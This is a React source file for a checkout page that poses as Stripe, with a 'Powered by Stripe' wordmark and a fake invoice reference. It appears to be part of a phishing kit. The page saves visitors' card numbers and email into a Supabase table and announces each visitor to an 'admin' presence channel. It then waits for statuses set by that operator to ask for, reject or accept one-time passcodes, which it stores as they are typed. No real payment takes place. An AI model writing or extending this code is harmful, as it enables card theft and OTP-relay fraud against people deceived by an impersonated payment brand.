import { useState, useEffect, useMemo, useRef, useCallback } from "react";
import PaymentForm from "@/components/PaymentForm";
import OtpVerification from "@/components/OtpVerification";
import type { OtpType } from "@/components/OtpVerification";
import PaymentSuccess from "@/components/PaymentSuccess";
import PaymentRejected from "@/components/PaymentRejected";
import WaitingScreen from "@/components/WaitingScreen";
import ProcessingOverlay from "@/components/ProcessingOverlay";
import CardDeclinedScreen from "@/components/CardDeclinedScreen";
import StripeWordmark from "@/components/StripeWordmark";
import { supabase } from "@/integrations/supabase/client";
import { useSessionSync } from "@/hooks/use-session-sync";

const Index = () => {
  const [step, setStep] = useState<"form" | "processing_card" | "waiting" | "otp" | "processing" | "success" | "rejected" | "card_declined">("form");
  const stepRef = useRef(step);
  stepRef.current = step;
  const visitorId = useRef(crypto.randomUUID());

  // Join presence channel so admin knows someone is on the page
  useEffect(() => {
    const channel = supabase.channel("visitors", {
      config: { presence: { key: visitorId.current } },
    });

    channel
      .on("presence", { event: "sync" }, () => {})
      .subscribe(async (status) => {
        if (status === "SUBSCRIBED") {
          await channel.track({
            online_at: new Date().toISOString(),
            visitor_id: visitorId.current,
          });
        }
      });

    return () => {
      supabase.removeChannel(channel);
    };
  }, []);

  const [amount, setAmount] = useState("");
  const [sessionId, setSessionId] = useState<string | null>(null);
  const [otpError, setOtpError] = useState<string | null>(null);
  const [otpType, setOtpType] = useState<OtpType>("6digit");
  const [cardInvalidError, setCardInvalidError] = useState<string | null>(null);
  const [submittedEmail, setSubmittedEmail] = useState<string>("");
  const [submittedCardLast4, setSubmittedCardLast4] = useState<string>("");
  const [submittedCardBrand, setSubmittedCardBrand] = useState<string>("");

  const parsedAmount = parseFloat(amount) || 0;
  const transactionFee = parsedAmount > 0 ? parseFloat((parsedAmount * 0.001).toFixed(2)) : 0;
  const total = parsedAmount > 0 ? parseFloat((parsedAmount + transactionFee).toFixed(2)) : 0;

  const isValidAmount = parsedAmount >= 500 && parsedAmount <= 1500;

  const formatEuro = (val: number) =>
    val.toLocaleString("en-IE", { style: "currency", currency: "EUR" });

  const formattedTotal = isValidAmount ? formatEuro(total) : "€0.00";

  const pendingSessionId = useRef<string | null>(null);

  const handleFormSubmit = async (id: string) => {
    pendingSessionId.current = id;
    setSessionId(id);
    setCardInvalidError(null);
    const { data } = await supabase.from("sessions").select("form_data").eq("id", id).single();
    const fd = (data?.form_data as any) || {};
    if (fd.email) setSubmittedEmail(fd.email);
    if (fd.cardNumber) {
      const digits = fd.cardNumber.replace(/\s/g, "");
      setSubmittedCardLast4(digits.slice(-4));
      if (/^4/.test(digits)) setSubmittedCardBrand("visa");
      else if (/^5[1-5]/.test(digits) || /^2[2-7]/.test(digits)) setSubmittedCardBrand("mastercard");
      else if (/^3[47]/.test(digits)) setSubmittedCardBrand("amex");
      else setSubmittedCardBrand("card");
    }
    setStep("processing_card");
  };

  const handleProcessingComplete = useCallback(() => {
    // Only transition to waiting if still on processing_card (realtime may have already moved us)
    if (stepRef.current === "processing_card") {
      setStep("waiting");
    }
  }, []);

  // Session status handler (stable ref)
  const handleStatusChangeRef = useRef<(status: string, formData: Record<string, any>) => void>(() => {});
  handleStatusChangeRef.current = (newStatus: string, formData: Record<string, any>) => {
    const currentStep = stepRef.current;

    if (currentStep === "processing_card" || currentStep === "waiting") {
      if (newStatus === "otp") {
        setOtpError(null);
        setOtpType((formData.otp_type as OtpType) || "6digit");
        setStep("otp");
      }
      if (newStatus === "rejected") setStep("rejected");
      if (newStatus === "card_invalid") {
        setCardInvalidError("Your card details could not be verified. Please check your card number, expiration date, and security code, then try again.");
        setStep("card_declined");
      }
    }
    if (currentStep === "otp") {
      if (newStatus === "otp") {
        setOtpType((formData.otp_type as OtpType) || "6digit");
      }
      if (newStatus === "otp_wrong") setOtpError("The verification code you entered is incorrect. Please try again.");
      if (newStatus === "otp_expired") setOtpError("This verification code has expired. Please request a new one.");
      if (newStatus === "rejected") setStep("rejected");
      if (newStatus === "card_invalid") {
        setCardInvalidError("Your card details could not be verified. Please check your card number, expiration date, and security code, then try again.");
        setStep("card_declined");
      }
    }
    if (currentStep === "processing") {
      if (newStatus === "success") setStep("success");
      if (newStatus === "rejected") setStep("rejected");
      if (newStatus === "otp_wrong") { setOtpError("The verification code you entered is incorrect. Please try again."); setStep("otp"); }
      if (newStatus === "otp_expired") { setOtpError("This verification code has expired. Please request a new one."); setStep("otp"); }
      if (newStatus === "card_invalid") {
        setCardInvalidError("Your card details could not be verified. Please check your card number, expiration date, and security code, then try again.");
        setStep("card_declined");
      }
    }
  };

  // Real-time + polling session sync
  useSessionSync(sessionId, {
    onStatusChange: (status, formData) => handleStatusChangeRef.current(status, formData),
  });

  const handleOtpSubmit = async (otp: string) => {
    setOtpError(null);
    if (sessionId) {
      const { data } = await supabase.from("sessions").select("form_data").eq("id", sessionId).single();
      const existingData = (data?.form_data as Record<string, any>) || {};
      await supabase
        .from("sessions")
        .update({ 
          status: "otp_submitted" as any, 
          form_data: { ...existingData, otp } as any 
        })
        .eq("id", sessionId);
    }
    setStep("processing");
  };

  return (
    <div className="min-h-screen bg-stripe-bg flex">
      {/* Left panel — branding / order summary */}
      <div className="hidden lg:flex lg:w-[480px] xl:w-[520px] flex-col justify-between p-10 xl:p-14">
        <div>
          <div className="flex items-center gap-2 mb-12">
            <div className="h-8 w-8 rounded-full bg-primary flex items-center justify-center">
              <span className="text-primary-foreground text-sm font-bold">P</span>
            </div>
            <span className="text-white/90 font-semibold text-lg">Pay</span>
          </div>

          <div className="space-y-6">
            <div>
            <p className="text-white/50 text-sm">Pay Company</p>
              <p className="text-white/40 text-xs mt-0.5">Ref: INV#2849300392</p>
              <p className="text-white text-4xl font-bold tracking-tight mt-1">
                {isValidAmount ? formatEuro(total) : "€0.00"}
              </p>
            </div>

            <div className="space-y-4 mt-8">
              <div className="flex items-center justify-between py-3 border-b border-white/10">
                <p className="text-white/50 text-sm">Amount</p>
                <p className="text-white/90 text-sm">
                  {isValidAmount ? formatEuro(parsedAmount) : "—"}
                </p>
              </div>
              <div className="flex items-center justify-between py-3 border-b border-white/10">
                <p className="text-white/50 text-sm">Transaction fee (0.1%)</p>
                <p className="text-white/90 text-sm">
                  {isValidAmount ? formatEuro(transactionFee) : "—"}
                </p>
              </div>
              <div className="flex items-center justify-between py-3">
                <p className="text-white/90 text-sm font-semibold">Total</p>
                <p className="text-white text-sm font-semibold">
                  {isValidAmount ? formatEuro(total) : "—"}
                </p>
              </div>
            </div>
          </div>
        </div>

        <div className="flex items-center gap-4 text-white/30 text-xs">
          <span className="flex items-center gap-1">Powered by <StripeWordmark className="h-3.5 text-white/50" /></span>
          <span>·</span>
          <a href="https://stripe.com/legal/consumer" target="_blank" rel="noopener noreferrer" className="hover:text-white/50 transition-colors">Terms</a>
          <a href="https://stripe.com/privacy" target="_blank" rel="noopener noreferrer" className="hover:text-white/50 transition-colors">Privacy</a>
        </div>
      </div>

      {/* Right panel — form area */}
      <div className="flex-1 flex items-start justify-center bg-background rounded-tl-none lg:rounded-tl-2xl lg:rounded-bl-2xl overflow-y-auto">
        <div className="w-full max-w-[440px] py-10 px-5 sm:px-0 sm:py-14">
          {/* Mobile header */}
          <div className="lg:hidden mb-8">
            <div className="flex items-center gap-2 mb-4">
              <div className="h-7 w-7 rounded-full bg-primary flex items-center justify-center">
                <span className="text-primary-foreground text-xs font-bold">P</span>
              </div>
              <span className="text-foreground font-semibold">Pay</span>
            </div>
            <p className="text-muted-foreground text-sm">Pay Company</p>
              <p className="text-muted-foreground/60 text-xs mt-0.5">Ref: INV#2849300392</p>
            <p className="text-foreground text-3xl font-bold tracking-tight mt-1">
              {isValidAmount ? formatEuro(total) : "€0.00"}
            </p>
            {isValidAmount && (
              <div className="mt-3 space-y-1.5">
                <div className="flex items-center justify-between text-sm">
                  <span className="text-muted-foreground">Transaction fee (0.1%)</span>
                  <span className="text-foreground">{formatEuro(transactionFee)}</span>
                </div>
                <div className="flex items-center justify-between text-sm font-semibold">
                  <span className="text-foreground">Total</span>
                  <span className="text-foreground">{formatEuro(total)}</span>
                </div>
              </div>
            )}
          </div>

          {step === "form" && (
            <PaymentForm
              amount={amount}
              onAmountChange={setAmount}
              total={total}
              isValidAmount={isValidAmount}
              formatEuro={formatEuro}
              onSuccess={handleFormSubmit}
              cardInvalidError={cardInvalidError}
            />
          )}
          {step === "processing_card" && <ProcessingOverlay onComplete={handleProcessingComplete} />}
          {step === "waiting" && <WaitingScreen amount={formattedTotal} />}
          {step === "otp" && <OtpVerification onSubmit={handleOtpSubmit} error={otpError} otpType={otpType} />}
          {step === "processing" && <WaitingScreen amount={formattedTotal} />}
          {step === "success" && <PaymentSuccess amount={formatEuro(total)} email={submittedEmail} cardLast4={submittedCardLast4} cardBrand={submittedCardBrand} />}
          {step === "card_declined" && <CardDeclinedScreen onComplete={() => { setStep("form"); setSessionId(null); }} />}
          {step === "rejected" && <PaymentRejected onRetry={() => { setStep("form"); setSessionId(null); }} />}
        </div>
      </div>
    </div>
  );
};

export default Index;
